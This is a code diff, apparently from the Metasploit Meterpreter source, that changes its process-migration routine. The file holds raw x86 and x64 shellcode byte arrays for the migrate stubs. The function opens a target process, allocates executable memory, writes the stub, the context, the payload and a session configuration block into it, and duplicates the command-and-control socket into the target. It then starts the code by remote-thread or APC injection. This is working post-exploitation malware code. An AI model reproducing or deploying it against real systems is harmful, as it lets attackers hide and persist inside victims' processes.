@@ -2,7 +2,7 @@
 #include "base_inject.h"
 #include "../../../config.h"
 
-// see '/msf3/external/source/shellcode/windows/x86/src/migrate/migrate.asm'
+// see 'external/source/shellcode/windows/x86/src/migrate/migrate.asm'
 BYTE migrate_stub_x86[] =	"\xFC\x8B\x74\x24\x04\x81\xEC\x00\x20\x00\x00\xE8\x89\x00\x00\x00"
 							"\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B\x52\x0C\x8B\x52\x14\x8B"
 							"\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61\x7C\x02\x2C"
@@ -18,7 +18,7 @@ BYTE migrate_stub_x86[] =	"\xFC\x8B\x74\x24\x04\x81\xEC\x00\x20\x00\x00\xE8\x89\
 							"\x10\x53\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\xFF"
 							"\x36\x68\x1D\x9F\x26\x35\xFF\xD5\xFF\x56\x08";
 
-// see '/msf3/external/source/shellcode/windows/x64/src/migrate/migrate.asm'
+// see 'external/source/shellcode/windows/x64/src/migrate/migrate.asm'
 BYTE migrate_stub_x64[] =	"\xFC\x48\x89\xCE\x48\x81\xEC\x00\x20\x00\x00\x48\x83\xE4\xF0\xE8"
 							"\xC8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48"
 							"\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48"
@@ -52,7 +52,7 @@ typedef struct _MIGRATECONTEXT
 
 	union
 	{
- 		LPVOID lpPayload;
+ 		LPBYTE lpPayload;
 		BYTE bPadding2[8];
 	} p;
 
@@ -326,12 +326,15 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 	HANDLE hEvent = NULL;
 	BYTE * lpPayloadBuffer = NULL;
 	LPVOID lpMigrateStub = NULL;
-	LPVOID lpMemory = NULL;
+	LPBYTE lpMemory = NULL;
 	MIGRATECONTEXT ctx = { 0 };
 	DWORD dwMigrateStubLength = 0;
 	DWORD dwPayloadLength = 0;
 	DWORD dwProcessID = 0;
 	DWORD dwDestinationArch = 0;
+
+	MetsrvConfig* config = NULL;
+	DWORD configSize = 0;
 
 	do
 	{
@@ -382,10 +385,15 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 			BREAK_ON_ERROR("[MIGRATE] OpenProcess failed")
 		}
 
-		if (remote->transport->get_socket)
+		// get the existing configuration
+		dprintf("[MIGRATE] creating the configuration block");
+		remote->config_create(remote, &config, &configSize);
+		dprintf("[MIGRATE] Config of %u bytes stashed at 0x%p", configSize, config);
+
+		if (config->session.comms_fd)
 		{
 			// Duplicate the socket for the target process if we are SSL based
-			if (WSADuplicateSocket(remote->transport->get_socket(remote->transport), dwProcessID, &ctx.info) != NO_ERROR)
+			if (WSADuplicateSocket(config->session.comms_fd, dwProcessID, &ctx.info) != NO_ERROR)
 			{
 				BREAK_ON_WSAERROR("[MIGRATE] WSADuplicateSocket failed")
 			}
@@ -419,44 +427,55 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 		else
 		{
 			SetLastError(ERROR_BAD_ENVIRONMENT);
-			BREAK_ON_ERROR("[MIGRATE] Invalid target architecture")
+			dprintf("[MIGRATE] Invalid target architecture: %u", dwDestinationArch);
+			break;
 		}
 
 		// Allocate memory for the migrate stub, context and payload
-		lpMemory = VirtualAllocEx(hProcess, NULL, dwMigrateStubLength + sizeof(MIGRATECONTEXT)+dwPayloadLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		lpMemory = (LPBYTE)VirtualAllocEx(hProcess, NULL, dwMigrateStubLength + sizeof(MIGRATECONTEXT) + dwPayloadLength + configSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 		if (!lpMemory)
 		{
 			BREAK_ON_ERROR("[MIGRATE] VirtualAllocEx failed")
 		}
 
 		// Calculate the address of the payload...
-		ctx.p.lpPayload = ((BYTE *)lpMemory + dwMigrateStubLength + sizeof(MIGRATECONTEXT));
+		ctx.p.lpPayload = lpMemory + dwMigrateStubLength + sizeof(MIGRATECONTEXT);
 
 		// Write the migrate stub to memory...
+		dprintf("[MIGRATE] Migrate stub: 0x%p -> %u bytes", lpMemory, dwMigrateStubLength);
 		if (!WriteProcessMemory(hProcess, lpMemory, lpMigrateStub, dwMigrateStubLength, NULL))
 		{
 			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 1 failed")
 		}
 
 		// Write the migrate context to memory...
-		if (!WriteProcessMemory(hProcess, ((BYTE *)lpMemory + dwMigrateStubLength), &ctx, sizeof(MIGRATECONTEXT), NULL))
+		dprintf("[MIGRATE] Migrate context: 0x%p -> %u bytes", lpMemory + dwMigrateStubLength, sizeof(MIGRATECONTEXT));
+		if (!WriteProcessMemory(hProcess, lpMemory + dwMigrateStubLength, &ctx, sizeof(MIGRATECONTEXT), NULL))
 		{
 			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 2 failed")
 		}
 
 		// Write the migrate payload to memory...
+		dprintf("[MIGRATE] Migrate payload: 0x%p -> %u bytes", ctx.p.lpPayload, dwPayloadLength);
 		if (!WriteProcessMemory(hProcess, ctx.p.lpPayload, lpPayloadBuffer, dwPayloadLength, NULL))
 		{
 			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 3 failed")
 		}
 
+		// finally write the configuration stub
+		dprintf("[MIGRATE] Configuration: 0x%p -> %u bytes", ctx.p.lpPayload + dwPayloadLength, configSize);
+		if (!WriteProcessMemory(hProcess, ctx.p.lpPayload + dwPayloadLength, config, configSize, NULL))
+		{
+			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 4 failed")
+		}
+
 		// First we try to migrate by directly creating a remote thread in the target process
-		if (inject_via_remotethread(remote, response, hProcess, dwDestinationArch, lpMemory, ((BYTE*)lpMemory + dwMigrateStubLength)) != ERROR_SUCCESS)
+		if (inject_via_remotethread(remote, response, hProcess, dwDestinationArch, lpMemory, lpMemory + dwMigrateStubLength) != ERROR_SUCCESS)
 		{
 			dprintf("[MIGRATE] inject_via_remotethread failed, trying inject_via_apcthread...");
 
 			// If that fails we can try to migrate via a queued APC in the target process
-			if (inject_via_apcthread(remote, response, hProcess, dwProcessID, dwDestinationArch, lpMemory, ((BYTE*)lpMemory + dwMigrateStubLength)) != ERROR_SUCCESS)
+			if (inject_via_apcthread(remote, response, hProcess, dwProcessID, dwDestinationArch, lpMemory, lpMemory + dwMigrateStubLength) != ERROR_SUCCESS)
 			{
 				BREAK_ON_ERROR("[MIGRATE] inject_via_apcthread failed")
 			}
@@ -466,20 +485,25 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 
 	} while (0);
 
+	SAFE_FREE(config);
+
 	// If we failed and have not sent the response, do so now
 	if (dwResult != ERROR_SUCCESS && response)
 	{
+		dprintf("[MIGRATE] Sending response");
 		packet_transmit_response(dwResult, remote, response);
 	}
 
 	// Cleanup...
 	if (hProcess)
 	{
+		dprintf("[MIGRATE] Closing the process handle 0x%08x", hProcess);
 		CloseHandle(hProcess);
 	}
 
 	if (hEvent)
 	{
+		dprintf("[MIGRATE] Closing the event handle 0x%08x", hEvent);
 		CloseHandle(hEvent);
 	}
 
@@ -489,6 +513,7 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 	}
 
 	// if migration succeeded, return 'FALSE' to indicate server thread termination.
+	dprintf("[MIGRATE] Finishing migration, result: %u", dwResult);
 	return ERROR_SUCCESS == dwResult ? FALSE : TRUE;
 }
 
